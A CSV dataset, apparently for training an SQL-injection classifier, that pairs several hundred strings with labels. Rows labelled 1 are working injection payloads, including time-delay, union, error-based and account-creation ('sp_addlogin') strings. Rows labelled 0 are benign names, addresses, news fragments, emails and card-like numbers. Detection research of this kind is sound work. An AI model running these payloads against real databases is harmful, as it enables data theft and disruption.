Sentence,Label
1 )  where 4573 = 4573,1
"1%'  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
8251009613844272,0
holloway_brandenburg@bijoubijoudiferente.hu,0
"1"" where 8635 = 8635 and 4595 = 4595#",1
24768,0
irua oka/irua de oca,0
cornejoviniero plasencia,0
matula,0
 &quot; He nevertheless praised Government responding request urgent assistance first raised Prime Minister beginning May ,0
reclinar,0
29450,0
44t4mpad6,0
16157298m,0
alcntar,0
1'+ ( select ejaj where 1651 = 1651 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   ) +',1
winde,0
43888363q,0
tope4a5o,0
"1%"" or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
romanov xandri,0
6256619473933426,0
"1'  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  'ogpg' = 'ogpg",1
homobono valds,0
" Their works done apology extenuation living world, — invalids insane pay high board",0
74677553a,0
 Are traditional e-mails read third parties journey net ? The majority e-mails read several times software robots en route recipient ,0
"1"" and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
"-6412  )  )   as cnfs where 6557 = 6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1
-3895' )  or 8645 = 5359--,1
myrna5@adondeir.at,0
ridgeley_fechner@beesmer.ye,0
"1' union all select null,null--",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
boquieni,0
1' )  where 9272 = 9272,1
cybotech,0
" Finally , tellingly , poll business leaders found clear majority wanted see Britain pursue course treaty change relationship EU based trade , politics ",0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null  )  )  +'",1
samuel,0
" started first carry-on fee three years ago , fellow discounter Allegiant Air later followed ",0
2061277853418882,0
0646137347424943,0
chasse,0
"exec sp_addlogin 'name' , 'password'",1
 He accompanied visit Russia two German journalists ,0
" In morning , service accompanied Laudato-Si Group , afternoon service featured &apos; The Spirit &apos; youth choir ",0
yevtushenko-pegna@corjet.al,0
wilmer@dubi.as,0
"-6618""  )  )   )  order by 1#",1
arrindell@salsaspain.so,0
 arch-rival Boeing says airlines decide ,0
19432,0
"1, ( select  ( case when  ( 4828 = 2600 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
wun,0
"1, ( select  ( case when  ( 5334 = 4976 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ",1
porta aylagas,0
fickes,0
"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",1
5558396757589314,0
c/ javea 57,0
"1' union all select null,null,null,null,null,null,null,null,null--",1
duornik-gracia@zeat.pt,0
 or x = x,1
13791863m,0
" select * from users where id = 1 or 1#""1 union select null,version (  )  -- 1",1
"-5207"" where 2050 = 2050 union all select 2050,2050,2050,2050,2050,2050,2050--",1
1973457393131031,0
 else dbms_lock.sleep ( 0 ) ,1
 The two traders would first RBS employees suspended widening probe echoes Libor interbank lending manipulation scandal ,0
"1%'  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
"-6940' )  union all select 3042,3042,3042,3042,3042#",1
"-4606"" )  as elek where 8261 = 8261 or 8571 = 8571--",1
osburn,0
" On Saturday 7 September , Highland Games start 1: 30 p",0
cadaqus,0
0588792998295469,0
"-9062"" or 6872 = 6872 and ""aumq"" like ""aumq",1
" British police serve Assange extradition notice Btitish police served extradition notice today WikiLeaks founder Julian Assange , taken refuge Ecuador &apos;s embassy London requested asylum ",0
"victoria, la",0
darnall,0
calle garaiar 29 7a,0
"1'+ ( select kpso where 1226 = 1226 union all select null,null,null,null,null,null,null,null--",1
gollu,0
6535683969714030,0
"1' and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and 'hstg' like 'hstg",1
1' )  and 1987 = 3756#,1
femke,0
1' where 4388 = 4388,1
"c/ geranio, 65",0
"1%""  )  )   and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
1'  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 'smrw' like 'smrw,1
aul,0
1'|| ( select 'qgnz' where 6446 = 6446,1
berber,0
" select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1",1
tetreaul7,0
ac4e4865r,0
decidir,0
forua,0
" Representatives Samsung , Huawei , HTC Rockstar could immediately reached ",0
58188584x,0
22200,0
75169095n,0
com/post/140267892711/management-consulting-via-how-to-get-more-value study 95 6 wr_datetime desc bbs338 12 view 122,0
"robert graves, 101",0
santibez de ecla,0
1  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 2197 = 2197,1
ballobar,0
feist8,0
6344938975904168,0
 select sleep ( 5 )  and  ( 'dcys' like 'dcys,1
aldea del fresno,0
nilda@nightflight.ec,0
94505880f,0
"1""  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
carlosmara,0
"1%"" )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( ""%"" = """,1
calle do fuso 19,0
"1  )  )   as rsnb where 3168 = 3168 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
-1772' or 7911 = 4985#,1
"-2916""  )  )   or 4946 = 8232--",1
rocinante,0
25214,0
stahel,0
avellano,0
 UN Secretary-General Ban Ki-moon told summit overnight time &quot; rise national interests ,0
histri985ent0,0
rubi de biasi,0
ca5r7211a,0
" The 21-year-old raped Anene Booysen February industrial estate Bredasdorp , near Capetown ",0
rom87231o,0
"arosa, 117 8?f",0
wendell@somosagelespaa.ml,0
sheffield@ringringrent.my,0
4872,0
laws cabezon,0
-5585' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ,1
5449723667500613,0
 We told public statements made Mayor also impact ,0
04711214d,0
25645562x,0
abieldar,0
"1'+ ( select sfmz where 4870 = 4870 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
olimpia,0
"1%"" order by 1#",1
"1  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 9558 = 9558",1
8461933657900272,0
9854854946355075,0
ajmet,0
 They require clear pathways order preserve species ,0
 They assume bad things going happen prevent criminal thought turning action ,0
ferreries,0
mike-osbourne@hiperzaragoza.qa,0
autoritariamente,0
adria,0
desportilladura,0
"1"" )  where 3084 = 3084 union all select null,null--",1
96685723w,0
"1%' union all select null,null#",1
2996877022240469,0
82380804w,0
mompel urdi,0
" &quot; Property investments offer attractive rate return , &quot; said Ulbrich ",0
08182,0
"1' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( 'rgue' like 'rgue",1
luxford_baumann@lasiestacreativa.tel,0
amarili,0
rumsey@ubikuo.coop,0
ayoroa,0
" At post-mortem campaign meeting , told staff needed get back track stay true purpose cause ",0
caballillo,0
"1""  )  )   )  and 4595 = 4595#",1
1'+ ( select goec where 9460 = 9460 rlike  ( select  ( case when  ( 4740 = 1203 )  then 1 else 0x28 end  )  )   ) +',1
 But concerns grown Mr Mazanga quoted saying Renamo abandoning 1992 peace accord ,0
" The report also gives overview discrimination faced intersex transgender people realm employment , well levels harassment , violence bias crimes ",0
"1"" )  and make_set ( 4539 = 6401,6401 )  and  ( ""kglx"" = ""kglx",1
beln,0
"1%' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and '%' = '",1
cangalaya,0
"-4596"" union all select 5761#",1
e4can7ilader0,0
marti,0
"-3885 )  where 2387 = 2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
1 waitfor delay '0:0:5'-- nnnp,1
93494708f,0
mesnadero,0
"c/ hermanos senise colmenero, 153, 3-d",0
" I ashamed think easily capitulate badges names, large societies dead institutions",0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  'bhlx' like 'bhlx",1
 select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1
1'+ ( select 'zgtu' where 8419 = 8419,1
tierra 17,0
 When police stopped discovered takeaway drink legs ,0
borrenes,0
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1
 We explain approach predicting punctuations transcribed speech texts Section 4,0
6552399616832844,0
08363269d,0
lopez castrillon 162,0
" The two towers , measuring around 157 metres , extend heavens , making Europe &apos;s second tallest church building ",0
zulaica,0
"-9318""  )  )   )  union all select 5223,5223,5223,5223#",1
" The bank , declined comment suspensions , confirmed month received requests information regulators ",0
"1, ( select  ( case when  ( 6750 = 6750 )  then 1 else 6750* ( select 6750 from information_schema.character_sets )  end  )  )  ",1
"1'  )  )   )  and make_set ( 7539 = 3946,3946 )  and   (  (   ( 'qbpo' = 'qbpo",1
1 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  ,1
select  ( case when  ( 7980 = 3703 )  then 7980 else 7980* ( select 7980 from information_schema.character_sets )  end ) #,1
1251745617275774,0
"calle azaa, s/n, 10?a",0
"1%"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and ""%"" = """,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (  ""qkat"" = ""qkat",1
"1""  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( ""fjwv"" like ""fjwv",1
4033,0
reig jallo,0
3059,0
"1' )  where 9226 = 9226 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
2557912970687783,0
"1%'  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  '%' = '",1
"1"" )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""kkim"" = ""kkim",1
3702,0
rub,0
empachadamente,0
inviolada,0
siede@comodepilarse.ye,0
hermindo,0
villafranca del bierzo,0
6716283137486863,0
serral torrell,0
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null,null#",1
merendero,0
"-3169"" order by 1#",1
blgico,0
"1""  )  )   )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( ""ecoa"" like ""ecoa",1
54tra03u38706,0
beaule,0
"-1407 where 1186 = 1186 union all select 1186,1186,1186,1186,1186--",1
92793320g,0
"1' )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( 'khah' like 'khah",1
princep muntadas,0
"1  )  )   as ambt where 5198 = 5198 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
"1' in boolean mode )  or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
 The pipeline designed annual capacity 2,0
garda,0
"1' )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and  ( 'ylit' like 'ylit",1
"1 )  union all select null,null,null#",1
cauifield@tuviaje.com.af,0
"-5493""  )  )   union all select 8001,8001--",1
prestamente,0
8788488827685780,0
"1'|| ( select 'xjcg' from dual where 5815 = 5815 union all select null,null,null#",1
"av. escultor pablo gargallo, s/n",0
villarramiel,0
19784273h,0
3ar6i383,0
"1  )  )   )  or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
lenya@fbi-criminal-network.com.mil,0
1'+ ( select 'fqkk' where 9725 = 9725,1
9osquil9a6,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""ejmj"" like ""ejmj",1
" Immediately local district derby FC Schalke 04 , travelling BVB fans fired flares crowds spectators onto pitch - almost hit goalkeeper Roman Weidenfeller ",0
gratallops,0
24174,0
sabinigo,0
"1%' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( '%' = '",1
"calle manco, 109, 10-g",0
select pg_sleep ( 5 )  and   (  (   ( 'qslr' = 'qslr,1
barres@engibraltar.bm,0
pdf 201704/00001491531111591,0
soguillo,0
senderow,0
"capmany, 94 4?e",0
1  )  )   as foul where 4361 = 4361 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
06370,0
"1"" )  where 7514 = 7514",1
" &quot; In aerospace , results line guidance , low order intake overall market conditions disappointment , &quot; Beaudoin said ",0
"-4256' )  where 9545 = 9545 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
", 2006b; Zhang Clark, 2008; Huang Sagae, 2010)",0
"1"" and  ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",1
select  ( case when  ( 4415 = 2051 )  then 4415 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
or 0 = 0 --,1
noy,0
1 )  as oknr where 3228 = 3228,1
solivellas mantecn,0
" &quot; He want multi-party democracy , want transparent elections want peace want leave presidency , &quot; Mr Mazanga said ",0
men3pea,0
cycelia,0
-4331 )  as inpx where 9804 = 9804 union all select 9804#,1
gontrn,0
3596949565075836,0
93640511j,0
potentado,0
sanderson@todobetis.ml,0
" That crippling cost disadvantage , &apos;ve already seen Grangemouth ",0
logr_era,0
" Further attractions Sunday corn maze , craft market sheep shearing ",0
"1""  )  )   as knyf where 8109 = 8109 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
" Snowden ready &quot; cooperate &quot; Germany US surveillance Edward Snowden , US intelligence whistleblower , declared willing travel Berlin give evidence German parliament US National Security Agency director Keith Alexander fail provide answers activities ",0
-2120' )  or 8734 = 8844#,1
macinnes,0
37428,0
gloriane,0
evin,0
joyan,0
quinones,0
serban,0
huebing@biosoftware.pe,0
09580,0
"1%' )  union all select null,null,null,null--",1
"select count ( * )  from generate_series ( 1,5000000  )  )  ||'",1
bascuan sureda,0
akca@muevetuweb.pa,0
trish,0
ladra belonne,0
77077342h,0
46625,0
"1 )  where 5385 = 5385 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
2969,0
"1""  )  )   )  and 9198 = 9198--",1
"calle castilla, 142 11?c",0
9568195762432395,0
"-6014"" or make_set ( 3003 = 2609,2609 ) ",1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",1
"1"" )  where 5358 = 5358",1
37217,0
"1"" where 7232 = 7232  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
finak,0
negrich,0
"-7347""  )  )   union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",1
colas@ozlon.rs,0
seipue,0
26532,0
manda,0
cohen encabo,0
paton,0
moscoso mesen,0
6821418764083161,0
-2505' or 9323 = 9323#,1
" Officers spotted Sarborough , 32 , dropping three bags cocaine lawyer &apos;s home Blackburn , Lancashire , Law Society dinner colleagues ",0
1126,0
doradura,0
marciana,0
"plaza de el salvador 91,",0
15821726a,0
19135,0
4371,0
2928996451183948,0
66226006j,0
"-4927'  )  )   union all select 1924,1924#",1
 The fact Africa lies closer many think means forgotten ,0
83217349z,0
gwillim.somerset@mystyleperfume.nl,0
frankfather@andrestabernero.dj,0
boring_besch@copiar.com.pg,0
desconsolar,0
pericles,0
amontona+r,0
cintio,0
" The Kluser lights protect cyclists , well travelling bus residents Bergle ",0
gelber serarols,0
28108650m,0
5861000706039696,0
select  ( case when  ( 9376 = 4521 )  then 1 else 9376* ( select 9376 from master..sysdatabases )  end ) --,1
aimar taulats,0
lage lloris,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
" With great technical effort , also possible conceal metadata email communication even possible tell communicating ",0
40320,0
1' )  where 8163 = 8163,1
"1%'  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
cors,0
" He realised , early , computers divinities ",0
108,0
-9100 )  or 8792 = 9550--,1
declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...,1
"c/ peiscola, 95 3?g",0
"1  )  )   union all select null,null,null,null,null--",1
pladeval berganciano,0
9067788407413640,0
" The Police Chief argues division power , military controls daily life - left State ",0
6048168713695182,0
" select * from users where id = 1 -@<@ union select 1,version (  )  -- 1",1
1' )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 'vnfi' = 'vnfi,1
thomaier,0
 The restrictions also become increasingly difficult enforce use devices become ubiquitous ,0
"-9508 )  union all select 9950,9950,9950,9950,9950,9950,9950#",1
"1""  )  )   and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (  ""gcyp"" like ""gcyp",1
waite,0
" Jumbo visits home Black Forest ham Jumbo search &quot; world &apos;s best ham &quot;: For TV programme &quot; Galileo &quot; , Pro7 star visited Bonndorf ",0
select  ( case when  ( 7254 = 5901 )  then 1 else 7254* ( select 7254 from master..sysdatabases )  end ) --,1
"1'  )  )   as usrk where 6324 = 6324 union all select null,null,null,null,null,null,null,null,null,null--",1
"c/ brazato, 132 2?g",0
shalne,0
select  ( case when  ( 6652 = 1932 )  then 6652 else 6652* ( select 6652 from information_schema.character_sets )  end ) #,1
curi piccech,0
1'+ ( select aqhj where 4419 = 4419,1
"c/ francisco de ricci 23, 1?c",0
" So , still Words With Friends , online Scrabble-type game actor Alec Baldwin playing smartphone 2011 famously booted American Airlines jet refusing turn device plane parked gate ",0
argelio,0
" Rohan Ramchandani , head European spot trading Citi , went leave week , Matt Gardiner , former senior currencies trader Barclays UBS , suspended Standard Chartered week ",0
1'  )  )   )  and 4069 = 8786 and   (  (   ( 'eftr' = 'eftr,1
"camino caserio parada, s/n, 4b",0
1'|| ( select 'adni' from dual where 6611 = 6611,1
"-1894' )  union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1
1'+ ( select 'supo' where 8691 = 8691,1
juli,0
"avenida constitucion espaola, 135,",0
"c/ pedro guezala 192, 6?a",0
1 where 3027 = 3027 and 4595 = 4595#,1
alfardilla,0
3933219208280602,0
desaplomar,0
jorey@20horas.ao,0
8749462900315765,0
adahuesca,0
if ( 2643 = 1393 )  select 2643 else drop function nqss--,1
b1a838c2fal8,0
03603247k,0
21468433a,0
nakanishi@mariposasentudia.ec,0
malory7,0
"-7678  )  )   )  union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1
travesia franco 160,0
8995996565558024,0
47355557y,0
grandinetti@mariposasentudia.mm,0
-4595' )  where 4892 = 4892 order by 1--,1
84276481l,0
 Tony Blair said &apos;d seize chance return Britain &apos;s prime minister - acknowledges comeback unlikely ,0
1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
en8relan3amien0o,0
"calle alegria, 79 9?f",0
"1'  )  )   or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  'uvlu' = 'uvlu",1
 There work trying incorporate syntactic features broaden view hypotheses punctuation prediction models (Roark et al,0
thate@didacramirez.eu,0
"1%""  )  )   )  union all select null,null,null,null#",1
85233754d,0
-9072 )  as saot where 2278 = 2278 order by 1#,1
1' and 4374 = 2305,1
iber,0
1418,0
8355091548756460,0
calle virgen de la macarena 72 2-c,0
41953346n,0
adolecer,0
19846981m,0
"1' )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 'yznd' like 'yznd",1
78260205z,0
" select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1
"1' in boolean mode )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #",1
" Whether life exists least , no-one knows ",0
870,0
29,0
"1'+ ( select thmg where 2546 = 2546 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
" In B Class , two teams Baiersbronn Freudenstadt faced Murgtalhalle Baiersbronn ",0
7562939151589208,0
1864402022200871,0
44420,0
-3520%' or 8571 = 8571--,1
com/]Buy Ciddds[/url] [url = http://vsdfasdfasdferic,0
1' where 2547 = 2547 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1
krystall,0
3117,0
9068716333740358,0
"1"" and sleep ( 5 ) #",1
"1 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  -- nqdb",1
" select sleep ( 5 )  and ""oivc"" like ""oivc",1
 They never believed died way sheriff concluded ,0
genero,0
"1%""  )  )   and make_set ( 9897 = 5557,5557 )  and   (  (  ""%"" = """,1
 That &apos;s 9 billion individual kernels corn ,0
26033,0
"1' )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'cssb' = 'cssb",1
ravid,0
39392,0
"c/ toledo 22,",0
"-8651"" )  where 8391 = 8391 union all select 8391,8391#",1
carrer puigmercadal 33 5h,0
1' )  where 3730 = 3730 and sleep ( 5 ) #,1
9636562879352994,0
conocchiari zagal,0
"passatge credit, 93, 13-c",0
"1%'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  '%' = '",1
gaylor,0
34485,0
"1' )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and  ( 'sstt' = 'sstt",1
shiley,0
-1564' )  order by 1--,1
-8641%' order by 1--,1
gussi,0
defrance,0
12232,0
05659,0
cosbey@ocymafa.py,0
"1%' or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and '%' = '",1
"1' )  union all select null,null,null,null,null,null,null,null,null,null--",1
"-2715'  )  )   union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1
mont?acargas,0
"1' )  as woka where 4316 = 4316 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
azcrate campalan,0
5698239787045859,0
 &quot; Basketball: Hopes growing Neckar Riesen (Neckar Giants),0
48707568p,0
viver,0
irureta kosiner,0
"1%""  )  )   union all select null,null,null,null,null,null,null#",1
"calle mestre chapi 48,",0
1'  )  )   or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (  'qiau' = 'qiau,1
"1 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) # zcyc",1
"1 )  as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
 The majority people put back minds long possible ,0
lugartenencia,0
"paratge ter, 33,",0
41992996x,0
ideimar,0
courtney_lovelle@quehaces.cy,0
villava/atarrabia,0
clerc,0
'; execute immediate 'sel' || 'ect us' || 'er',1
"1""  )  )   as pxdp where 4575 = 4575 and elt ( 8258 = 7218,7218 ) --",1
"1'  )  )   as jpxj where 6153 = 6153 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
kwasniewska.tamburi@testdevelcidad.cr,0
bezante,0
enco,0
"1""  )  )   waitfor delay '0:0:5' and   (  (  ""witb"" = ""witb",1
98058748l,0
